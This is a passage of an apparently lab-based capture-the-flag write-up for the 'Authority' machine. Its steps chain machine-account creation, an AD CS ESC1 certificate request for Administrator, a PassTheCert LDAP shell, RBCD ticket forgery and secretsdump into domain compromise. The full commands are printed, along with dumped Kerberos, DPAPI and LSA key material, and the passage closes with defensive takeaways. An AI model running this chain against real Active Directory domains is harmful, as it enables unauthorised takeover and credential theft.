❯ nxc ldap 10.129.20.165 -u svc_ldap -p '<REDACTED>!' -M maq
LDAP        10.129.20.165   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb) (signing:Enforced) (channel binding:Never)
LDAP        10.129.20.165   389    AUTHORITY        [+] authority.htb\svc_ldap:<REDACTED>!
MAQ         10.129.20.165   389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         10.129.20.165   389    AUTHORITY        MachineAccountQuota: 10

```

**Findings:** MachineAccountQuota was set to the default value of `10`, allowing any authenticated user to add up to 10 computer accounts.

**16. Machine Account Creation**  
A new machine account `POOP$` was created with a known password.

```bash 
❯ addcomputer.py 'authority.htb/svc_ldap:<REDACTED>!' -method LDAPS -computer-name POOP -computer-pass honeypoop -dc-ip 10.129.20.165
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account POOP$ with password honeypoop.

```

### Phase 8: ESC1 Certificate Request

**17. Certificate Request as Administrator**  
Using the new machine account, a certificate was requested from the `CorpVPN` template with the UPN set to `administrator@authority.htb`.

```bash 
❯ certipy req -username 'POOP$' -password honeypoop -ca AUTHORITY-CA -dc-ip 10.129.20.165 -template CorpVPN -upn administrator@authority.htb -dns authority.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 2
[*] Successfully requested certificate
[*] Got certificate with multiple identities
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator_authority.pfx'
[*] Wrote certificate and private key to 'administrator_authority.pfx'

```

**Findings:** A certificate for `administrator@authority.htb` was successfully obtained and saved as `administrator_authority.pfx`.

### Phase 9: LDAP Shell with PassTheCert

**18. Certificate Conversion**  
The PFX certificate was split into separate key and certificate files.

```bash 
❯ certipy auth -pfx administrator_authority.pfx -dc-ip 10.129.20.165
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@authority.htb'
[*]     SAN DNS Host Name: 'authority.htb'
[*] Found multiple identities in certificate
[*] Please select an identity:
    [0] UPN: 'administrator@authority.htb' (administrator@authority.htb)
    [1] DNS Host Name: 'authority.htb' (authority$@htb)
> 0
[*] Using principal: 'administrator@authority.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information


we need to use another tool to pass the cert 

❯ certipy cert -pfx administrator_authority.pfx -nocert -out administrator.key
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Data written to 'administrator.key'
[*] Writing private key to 'administrator.key'
❯ certipy cert -pfx administrator_authority.pfx -nokey -out administrator.crt
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Data written to 'administrator.crt'
[*] Writing certificate to 'administrator.crt'

 ~honeypoop/HTB/C/Au/03-Attack-Chains      

```

**19. LDAP Shell Access**  
The certificate was used with PassTheCert to gain an LDAP shell.
**20. Group Membership Modification**  
Using the LDAP shell, `svc_ldap` was added to the `Administrators` group.

```bash 
❯ python3 /opt/PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.129.20.165

Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands

# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 exit - Terminates this session.

#add_user_to_group svc_ldap administrators 

```

**21. Verification**  
The group membership change was verified in the WinRM session.

```bash
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> net users svc_ldap
User name                    svc_ldap
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/10/2022 8:29:31 PM
Password expires             Never
Password changeable          8/11/2022 8:29:31 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/5/2023 7:43:09 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc_ldap\Documents>
```

**Findings:** `svc_ldap` was now a member of the local `Administrators` group.

### Phase 10: Resource-Based Constrained Delegation

**22. RBCD Configuration**  
With elevated privileges, RBCD was configured to allow the `POOP$` machine account to impersonate users on the domain controller.




```bash 
❯ python3 /opt/PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'POOP$' -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.129.20.165

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] POOP$ can now impersonate users on AUTHORITY$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     POOP$        (S-1-5-21-622327497-3269355298-2248959698-12102)
```

**Findings:** RBCD was successfully configured, allowing `POOP$` to impersonate users on `AUTHORITY$`.


**23. Service Ticket Request**  
A service ticket for `Administrator` was requested using the RBCD configuration.
```bash

❯ getST.py -spn 'cifs/AUTHORITY.AUTHORITY.HTB' -impersonate Administrator 'authority.htb/POOP$:honeypoop'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_AUTHORITY.AUTHORITY.HTB@AUTHORITY.HTB.ccache
❯ export KRB5CCNAME=Administrator@cifs_AUTHORITY.AUTHORITY.HTB@AUTHORITY.HTB.ccache
```

### Phase 11: Domain Compromise

**24. Secretsdump with Kerberos**  
Using the obtained service ticket, secretsdump was used to extract all domain hashes.

```bash 
❯ secretsdump.py -k -no-pass 'authority.htb/administrator@authority.authority.htb'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x31f4629800790a973f9995cec47514c6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED_ADMIN_HASH>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
HTB\AUTHORITY$:plain_password_hex:73e8d453e5f6716868afa818bc825cebea05c9b7b8f17fbf73a07bd0a366da6f806cb83bf3e96fecd5f7883e9d0347a56bc3652cc39f4c71061dd66e47421cf7a890d8db80e10c6a2d785b481473cf9868aadae3c192429f3a41a425028abf17958eaf134da8b18ea6afc65b47ab18a9e1b1446db3346de24f2159b21123db5a2539186a2e2c3323388766d25e10dc5273d0b5ff0d55c824f1ee642598d6c07a0df92c5745d068b938ff69cf881b1b5fa95092b81ef5855da4e034aa19a541905c6d1b40d726a78e471c46c49255c343dbc1e41c0642ec6aa4c480492975da91fbe7bdba2e6f0e23c4a29368b0ddb66c
HTB\AUTHORITY$:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0xd5d60027f85b1132cef2cce88a52670918252114
dpapi_userkey:0x047c1e3ad8db9d688c3f1e9ea06c8f2caf002511
[*] NL$KM
 0000   F9 41 4F E3 80 49 A5 BD  90 2D 68 32 F7 E3 8E E7   .AO..I...-h2....
 0010   7F 2D 9B 4B CE 29 B0 E6  E0 2C 59 5A AA B7 6F FF   .-.K.)...,YZ..o.
 0020   5A 4B D6 6B DB 2A FA 1E  84 09 35 35 9F 9B 2D 11   ZK.k.*....55..-.
 0030   69 4C DE 79 44 BA E1 4B  5B BC E2 77 F4 61 AE BA   iL.yD..K[..w.a..
NL$KM:f9414fe38049a5bd902d6832f7e38ee77f2d9b4bce29b0e6e02c595aaab76fff5a4bd66bdb2afa1e840935359f9b2d11694cde7944bae14b5bbce277f461aeba
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
POOP$:12102:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72c97be1f2c57ba5a51af2ef187969af4cf23b61b6dc444f93dd9cd1d5502a81
Administrator:aes128-cts-hmac-sha1-96:b5fb2fa35f3291a1477ca5728325029f
Administrator:des-cbc-md5:8ad3d50efed66b16
krbtgt:aes256-cts-hmac-sha1-96:1be737545ac8663be33d970cbd7bebba2ecfc5fa4fdfef3d136f148f90bd67cb
krbtgt:aes128-cts-hmac-sha1-96:d2acc08a1029f6685f5a92329c9f3161
krbtgt:des-cbc-md5:a1457c268ca11919
svc_ldap:aes256-cts-hmac-sha1-96:3773526dd267f73ee80d3df0af96202544bd2593459fdccb4452eee7c70f3b8a
svc_ldap:aes128-cts-hmac-sha1-96:08da69b159e5209b9635961c6c587a96
svc_ldap:des-cbc-md5:01a8984920866862
AUTHORITY$:aes256-cts-hmac-sha1-96:2a498d228013a5d276e67e4874d2c7310c6247e8e74c05246a1779704f2f0e05
AUTHORITY$:aes128-cts-hmac-sha1-96:d092a1831156fb9773fd01b09d41ed3c
AUTHORITY$:des-cbc-md5:101046f85b0d2691
POOP$:aes256-cts-hmac-sha1-96:13e0d4cf9b5e861b538f52e2628884560341267518e50db4e8b1ab74531387de
POOP$:aes128-cts-hmac-sha1-96:7fe819cd65bf54622a5128d40cf90c09
POOP$:des-cbc-md5:8957c23720eab358
[*] Cleaning up...
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up...
[*] Stopping service RemoteRegistry

```

**Findings:** The NT hash for the `Administrator` account was obtained: `<REDACTED_ADMIN_HASH>`.

**25. Domain Administrator Access**  
With the Administrator hash, full domain compromise was achieved.

### Phase 12: Flag Retrieval

**26. Root Flag**  
The root flag was retrieved from the Administrator's desktop.

```powershell
cd C:\Users\Administrator\Desktop
type root.txt
```
**Findings:** The root flag was successfully retrieved: `<REDACTED_ROOT_FLAG>`.

## Key Takeaways

- **Anonymous Share Access:** Publicly accessible SMB shares can expose sensitive configuration files and credentials.
    
- **Ansible Vault Security:** Vault-encrypted strings are only as secure as their passwords; weak passwords can be cracked.
    
- **PWM Application Risks:** PWM applications configured with LDAP can leak credentials in cleartext during binding.
    
- **AD CS ESC1 Vulnerability:** Certificate templates allowing enrollee-supplied subjects with client authentication can be abused to request certificates for any user, including administrators.
    
- **MachineAccountQuota:** The default setting of 10 allows any authenticated user to add computer accounts, enabling various attack vectors including ESC1 and RBCD.
    
- **Resource-Based Constrained Delegation:** RBCD can be configured to allow machine accounts to impersonate privileged users, leading to domain compromise.
    
- **Defense in Depth:** Multiple layers of security are necessary as single misconfigurations can be chained together for complete compromise.
